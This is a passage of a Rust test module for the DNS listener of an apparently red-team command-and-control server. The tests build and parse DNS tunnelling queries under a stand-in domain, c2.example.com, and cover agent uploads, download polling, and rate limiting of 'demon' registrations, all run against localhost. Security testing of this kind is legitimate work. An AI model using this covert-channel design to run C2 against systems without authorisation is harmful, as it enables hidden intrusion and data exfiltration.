        for label in qname.split('.') {
            buf.push(label.len() as u8);
            buf.extend_from_slice(label.as_bytes());
        }
        buf.push(0); // zero terminator
        buf.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
        buf.extend_from_slice(&1u16.to_be_bytes()); // QCLASS IN
        buf
    }

    fn build_dns_txt_query(id: u16, qname: &str) -> Vec<u8> {
        build_dns_query(id, qname, DNS_TYPE_TXT)
    }

    fn build_dns_cname_query(id: u16, qname: &str) -> Vec<u8> {
        build_dns_query(id, qname, DNS_TYPE_CNAME)
    }

    #[test]
    fn base32hex_encode_and_decode_round_trip() {
        let cases: &[&[u8]] =
            &[b"hello", b"", b"\x00\xff\xaa", b"The quick brown fox jumps over the lazy dog"];
        for &data in cases {
            let encoded = base32hex_encode(data);
            let decoded = base32hex_decode(&encoded).expect("decode failed");
            assert_eq!(decoded, data, "round trip failed for {data:?}");
        }
    }

    #[test]
    fn base32hex_decode_is_case_insensitive() {
        let lower = base32hex_decode("c9gq6u").expect("lower decode failed");
        let upper = base32hex_decode("C9GQ6U").expect("upper decode failed");
        assert_eq!(lower, upper);
    }

    #[test]
    fn base32hex_decode_rejects_invalid_characters() {
        assert!(base32hex_decode("XY!").is_none());
        assert!(base32hex_decode("ZZZZ").is_none()); // Z is not in base32hex
    }

    #[test]
    fn parse_dns_query_extracts_labels_and_type() {
        let qname = "data.0-1-deadbeef.up.c2.example.com";
        let packet = build_dns_txt_query(0x1234, qname);
        let parsed = parse_dns_query(&packet).expect("parse failed");
        assert_eq!(parsed.id, 0x1234);
        assert_eq!(parsed.qtype, DNS_TYPE_TXT);
        assert_eq!(parsed.labels, &["data", "0-1-deadbeef", "up", "c2", "example", "com"]);
        // qname_raw includes zero terminator
        assert_eq!(
            *parsed.qname_raw.last().expect("DNS qname should end with a zero-length label"),
            0
        );
    }

    #[test]
    fn parse_dns_query_rejects_short_packets() {
        assert!(parse_dns_query(&[0u8; 3]).is_none());
    }

    #[test]
    fn parse_dns_query_rejects_multiple_questions() {
        let mut packet = build_dns_txt_query(1, "foo.bar");
        // Set qdcount = 2
        packet[4] = 0;
        packet[5] = 2;
        assert!(parse_dns_query(&packet).is_none());
    }

    #[test]
    fn parse_dns_query_rejects_response_packets() {
        let mut packet = build_dns_txt_query(0x1234, "foo.bar");
        packet[2] |= 0x80;
        assert!(parse_dns_query(&packet).is_none());
    }

    #[test]
    fn parse_dns_c2_query_recognises_upload_query() {
        let data = b"hello";
        let b32 = base32hex_encode(data);
        let labels: Vec<String> = [b32.as_str(), "0-1-deadbeef", "up", "c2", "example", "com"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let result = parse_dns_c2_query(&labels, "c2.example.com");
        let Some(super::DnsC2Query::Upload { agent_id, seq, total, data: decoded }) = result else {
            panic!("expected Upload variant");
        };
        assert_eq!(agent_id, 0xDEAD_BEEF);
        assert_eq!(seq, 0);
        assert_eq!(total, 1);
        assert_eq!(decoded, b"hello");
    }

    #[test]
    fn parse_dns_c2_query_recognises_download_query() {
        let labels: Vec<String> =
            ["3-cafebabe", "dn", "c2", "example", "com"].iter().map(|s| s.to_string()).collect();
        let result = parse_dns_c2_query(&labels, "c2.example.com");
        let Some(super::DnsC2Query::Download { agent_id, seq }) = result else {
            panic!("expected Download variant");
        };
        assert_eq!(agent_id, 0xCAFE_BABE);
        assert_eq!(seq, 3);
    }

    #[test]
    fn parse_dns_c2_query_rejects_wrong_domain() {
        let labels: Vec<String> = ["data", "0-1-deadbeef", "up", "other", "domain", "com"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert!(parse_dns_c2_query(&labels, "c2.example.com").is_none());
    }

    #[test]
    fn build_dns_txt_response_produces_parseable_answer() {
        let packet = build_dns_query(0xABCD, "test.c2.example.com", DNS_TYPE_A);
        let parsed = parse_dns_query(&packet).expect("parse failed");
        let txt = b"ok";
        let response = build_dns_txt_response(parsed.id, &parsed.qname_raw, parsed.qtype, txt);

        // Response must be at least header + question + answer
        assert!(response.len() >= DNS_HEADER_LEN);
        // QR bit set
        assert!(response[2] & 0x80 != 0, "QR bit not set");
        // ANCOUNT = 1
        let ancount = u16::from_be_bytes([response[6], response[7]]);
        assert_eq!(ancount, 1);
        let question_qtype_offset = DNS_HEADER_LEN + parsed.qname_raw.len();
        let echoed_qtype = u16::from_be_bytes([
            response[question_qtype_offset],
            response[question_qtype_offset + 1],
        ]);
        assert_eq!(echoed_qtype, DNS_TYPE_A);
    }

    #[test]
    fn dns_allowed_query_types_defaults_to_txt_and_supports_cname() {
        assert_eq!(dns_allowed_query_types(&[]), Some(vec![DNS_TYPE_TXT]));
        assert_eq!(
            dns_allowed_query_types(&["txt".to_owned(), "CNAME".to_owned(), "A".to_owned()]),
            Some(vec![DNS_TYPE_TXT, DNS_TYPE_CNAME, DNS_TYPE_A])
        );
        assert!(dns_allowed_query_types(&["MX".to_owned()]).is_none());
    }

    #[test]
    fn chunk_response_splits_payload_into_base32hex_chunks() {
        let payload = vec![0xABu8; 300]; // 300 bytes > 1 chunk (125 bytes each)
        let chunks = chunk_response_to_b32hex(&payload);
        assert_eq!(chunks.len(), 3); // ceil(300/125) = 3
        // Each chunk decodes back to the expected slice
        let mut reassembled = Vec::new();
        for chunk in &chunks {
            let decoded = base32hex_decode(chunk).expect("chunk decode failed");
            reassembled.extend_from_slice(&decoded);
        }
        assert_eq!(reassembled, payload);
    }

    #[tokio::test]
    async fn dns_listener_starts_and_responds_to_unknown_queries_with_refused() {
        let port = free_udp_port();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-test".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        };
        let (handle, _) = spawn_test_dns_listener(config).await;

        // Brief delay for the listener to bind
        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        // Send a query for an unrecognised C2 domain — expect REFUSED
        let packet = build_dns_txt_query(0x1111, "something.other.domain.com");
        client.send(&packet).await.expect("send failed");

        let mut buf = vec![0u8; 512];
        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
            .await
            .expect("no response received")
            .expect("recv failed");

        // RCODE should be 5 (REFUSED)
        let rcode = buf[3] & 0x0F;
        assert_eq!(rcode, 5, "expected REFUSED RCODE");
        handle.abort();
    }

    #[tokio::test]
    async fn dns_listener_download_poll_returns_wait_when_no_response_queued() {
        let port = free_udp_port();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-wait".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        };
        let (handle, _) = spawn_test_dns_listener(config).await;

        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        // Download poll for agent 0xDEADBEEF, seq 0
        let qname = "0-deadbeef.dn.c2.example.com";
        let packet = build_dns_txt_query(0x2222, qname);
        client.send(&packet).await.expect("send failed");

        let mut buf = vec![0u8; 512];
        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
            .await
            .expect("no response received")
            .expect("recv failed");

        // NOERROR (RCODE=0)
        let rcode = buf[3] & 0x0F;
        assert_eq!(rcode, 0, "expected NOERROR");

        // ANCOUNT = 1
        let ancount = u16::from_be_bytes([buf[6], buf[7]]);
        assert_eq!(ancount, 1);
        handle.abort();
    }

    #[tokio::test]
    async fn dns_listener_rate_limits_demon_init_per_source_ip() {
        let port = free_udp_port();
        let domain = "c2.example.com".to_owned();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-init-limit".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: domain.clone(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        };
        let (handle, registry) = spawn_test_dns_listener(config).await;

        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        for attempt in 0..=MAX_DEMON_INIT_ATTEMPTS_PER_IP {
            let agent_id = 0x3000_0000 + attempt;
            let payload =
                valid_demon_init_body(agent_id, [0x41; AGENT_KEY_LENGTH], [0x24; AGENT_IV_LENGTH]);
            let chunks: Vec<&[u8]> = payload.chunks(39).collect();
            let total = u16::try_from(chunks.len()).expect("chunk count should fit in u16");
            let expected_txt = if attempt < MAX_DEMON_INIT_ATTEMPTS_PER_IP { "ack" } else { "err" };

            for (seq, chunk) in chunks.iter().enumerate() {
                let qname = dns_upload_qname(
                    agent_id,
                    u16::try_from(seq).expect("chunk index should fit in u16"),
                    total,
                    chunk,
                    &domain,
                );
                let packet = build_dns_txt_query(0x4000 + seq as u16, &qname);
                client.send(&packet).await.expect("send failed");

                let mut buf = vec![0u8; 1024];
                tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
                    .await
                    .expect("no response received")
                    .expect("recv failed");

                let txt = parse_dns_txt_answer(&buf).expect("TXT answer should parse");
                let is_last = seq + 1 == chunks.len();
                if is_last {
                    assert_eq!(txt, expected_txt);
                } else {
                    assert_eq!(txt, "ok");
                }
            }

            if attempt < MAX_DEMON_INIT_ATTEMPTS_PER_IP {
                assert!(registry.get(agent_id).await.is_some());
            } else {
                assert!(registry.get(agent_id).await.is_none());
            }
        }
        handle.abort();
    }

    #[tokio::test]
    async fn dns_listener_refuses_query_types_not_enabled_by_config() {
        let port = free_udp_port();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-txt-only".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        };
        let (handle, _) = spawn_test_dns_listener(config).await;

        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        let packet = build_dns_query(0x3333, "0-deadbeef.dn.c2.example.com", DNS_TYPE_A);
        client.send(&packet).await.expect("send failed");

        let mut buf = vec![0u8; 512];
        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
            .await
            .expect("no response received")
            .expect("recv failed");

        assert_eq!(buf[3] & 0x0F, 5, "expected REFUSED RCODE");
        handle.abort();
    }

    #[tokio::test]
    async fn dns_listener_responds_to_a_burst_of_udp_queries() {
        let port = free_udp_port();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-burst".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["TXT".to_owned()],
            kill_date: None,
            working_hours: None,
        };
        let (handle, _) = spawn_test_dns_listener(config).await;

        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        for id in 0x5000..0x5010 {
            let packet = build_dns_txt_query(id, "burst.other.domain.com");
            client.send(&packet).await.expect("send failed");
        }

        let mut buf = vec![0u8; 512];
        let mut seen_ids = HashSet::new();
        for _ in 0x5000..0x5010 {
            let received = tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
                .await
                .expect("no response received")
                .expect("recv failed");
            assert!(received >= DNS_HEADER_LEN, "response too short");
            seen_ids.insert(u16::from_be_bytes([buf[0], buf[1]]));
            assert_eq!(buf[3] & 0x0F, 5, "expected REFUSED RCODE");
        }
        assert_eq!(seen_ids.len(), 16, "every burst query should receive a response");

        handle.abort();
    }

    #[tokio::test]
    async fn dns_listener_accepts_cname_queries_when_enabled() {
        let port = free_udp_port();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-cname".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["CNAME".to_owned()],
            kill_date: None,
            working_hours: None,
        };
        let (handle, _) = spawn_test_dns_listener(config).await;

        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        let packet = build_dns_cname_query(0x4444, "0-deadbeef.dn.c2.example.com");
        client.send(&packet).await.expect("send failed");

        let mut buf = vec![0u8; 512];
        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
            .await
            .expect("no response received")
            .expect("recv failed");

        assert_eq!(buf[3] & 0x0F, 0, "expected NOERROR");
        let ancount = u16::from_be_bytes([buf[6], buf[7]]);
        assert_eq!(ancount, 1);
        let parsed = parse_dns_query(&packet).expect("query should parse");
        let question_qtype_offset = DNS_HEADER_LEN + parsed.qname_raw.len();
        let echoed_qtype =
            u16::from_be_bytes([buf[question_qtype_offset], buf[question_qtype_offset + 1]]);
        assert_eq!(echoed_qtype, DNS_TYPE_CNAME);
        handle.abort();
    }

    #[tokio::test]
    async fn dns_listener_start_rejects_unsupported_record_types() {
        let port = free_udp_port();
        let config = red_cell_common::DnsListenerConfig {
            name: "dns-invalid-type".to_owned(),
            host_bind: "127.0.0.1".to_owned(),
            port_bind: port,
            domain: "c2.example.com".to_owned(),
            record_types: vec!["MX".to_owned()],
            kill_date: None,
            working_hours: None,
        };

        let database = Database::connect_in_memory().await.expect("database creation failed");
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let error = match spawn_dns_listener_runtime(
            &config,
            registry,
            events,
            database,
            sockets,
            None,
            DemonInitRateLimiter::new(),
            ShutdownController::new(),
            super::DEFAULT_MAX_DOWNLOAD_BYTES,
        )
        .await
        {
            Ok(_) => panic!("start should fail"),
            Err(error) => error,
        };
        assert!(
            error.to_string().contains("unsupported DNS record type configuration"),
            "unexpected error: {error}"
        );
    }

    #[tokio::test]
    async fn dns_listener_download_done_removes_pending_response() {
        let state = dns_state("dns-cleanup").await;
        let agent_id = 0xDEAD_BEEF;

        state.responses.lock().await.insert(
            agent_id,
            DnsPendingResponse {
                chunks: vec!["AAA".to_owned(), "BBB".to_owned()],
                received_at: Instant::now(),
            },
        );

        assert_eq!(state.handle_download(agent_id, 0).await, "2 AAA");
        assert!(state.responses.lock().await.contains_key(&agent_id));

        assert_eq!(state.handle_download(agent_id, 2).await, "done");
        assert!(!state.responses.lock().await.contains_key(&agent_id));
        assert_eq!(state.handle_download(agent_id, 0).await, "wait");
    }

    #[tokio::test]
    async fn dns_upload_rejects_total_over_limit() {
        let state = dns_state("dns-total-cap").await;

        let result =
            state.try_assemble_upload(0xDEAD_BEEF, 0, DNS_MAX_UPLOAD_CHUNKS + 1, vec![0x41]).await;

        assert_eq!(result, DnsUploadAssembly::Rejected);
        assert!(state.uploads.lock().await.is_empty());
    }

    #[tokio::test]
    async fn dns_upload_rejects_inconsistent_total_and_clears_session() {
        let state = dns_state("dns-total-mismatch").await;
        let agent_id = 0xDEAD_BEEF;

        let first = state.try_assemble_upload(agent_id, 0, 2, vec![0x41]).await;
        assert_eq!(first, DnsUploadAssembly::Pending);

        let second = state.try_assemble_upload(agent_id, 1, 3, vec![0x42]).await;
        assert_eq!(second, DnsUploadAssembly::Rejected);
        assert!(!state.uploads.lock().await.contains_key(&agent_id));
    }

    #[tokio::test]
    async fn dns_upload_rejects_new_session_when_capacity_reached() {
        let state = dns_state("dns-capacity").await;

        {
            let mut uploads = state.uploads.lock().await;
            for agent_id in 0..DNS_MAX_PENDING_UPLOADS {
                uploads.insert(
                    agent_id as u32,
                    DnsPendingUpload {
                        chunks: HashMap::new(),
                        total: 1,
                        received_at: Instant::now(),
                    },
                );
            }
        }

        let result = state.try_assemble_upload(0xDEAD_BEEF, 0, 1, vec![0x41]).await;

        assert_eq!(result, DnsUploadAssembly::Rejected);
        assert_eq!(state.uploads.lock().await.len(), DNS_MAX_PENDING_UPLOADS);
    }

    #[tokio::test]
    async fn dns_upload_cleanup_removes_expired_sessions() {
        let state = dns_state("dns-expiry").await;
        let stale_age = Duration::from_secs(DNS_UPLOAD_TIMEOUT_SECS + 1);

        {
            let mut uploads = state.uploads.lock().await;
            uploads.insert(
                1,
                DnsPendingUpload {
                    chunks: HashMap::new(),
                    total: 1,
                    received_at: Instant::now() - stale_age,
                },
            );
            uploads.insert(
                2,
                DnsPendingUpload { chunks: HashMap::new(), total: 1, received_at: Instant::now() },
            );
        }
        {
            let mut responses = state.responses.lock().await;
            responses.insert(
                3,
                DnsPendingResponse {
                    chunks: vec!["AAA".to_owned()],
                    received_at: Instant::now() - stale_age,
                },
            );
            responses.insert(
                4,
                DnsPendingResponse { chunks: vec!["BBB".to_owned()], received_at: Instant::now() },
            );
        }

        state.cleanup_expired_uploads().await;

        let uploads = state.uploads.lock().await;
        assert!(!uploads.contains_key(&1));
        assert!(uploads.contains_key(&2));
        drop(uploads);

        let responses = state.responses.lock().await;
        assert!(!responses.contains_key(&3));
        assert!(responses.contains_key(&4));
    }
}
